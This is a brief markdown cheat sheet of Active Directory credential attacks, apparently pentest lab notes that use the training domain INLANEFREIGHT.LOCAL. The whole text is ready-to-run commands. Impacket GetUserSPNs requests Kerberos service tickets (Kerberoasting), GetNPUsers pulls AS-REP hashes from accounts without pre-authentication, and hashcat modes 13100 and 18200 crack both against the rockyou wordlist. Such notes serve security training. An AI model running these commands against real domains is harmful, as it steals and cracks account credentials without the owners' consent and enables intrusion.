# Kerberoasting

## Check

```sh
impacket-GetUserSPNs domain/username:'password' -dc-ip $target
```

## Request

```sh
impacket-GetUserSPNs domain/username:'password' -dc-ip $target -request
```

## Crack it

```sh
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

# AS-REP Roasting

```sh
impacket-GetNPUsers INLANEFREIGHT.LOCAL/ -usersfile users.txt -no-pass -dc-ip 10.10.14.57 -format hashcat -outputfile asrep_hashes.txt

impacket-GetNPUsers INLANEFREIGHT.LOCAL/mholliday -request -dc-ip 172.16.5.5
```

## Crack

```sh
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```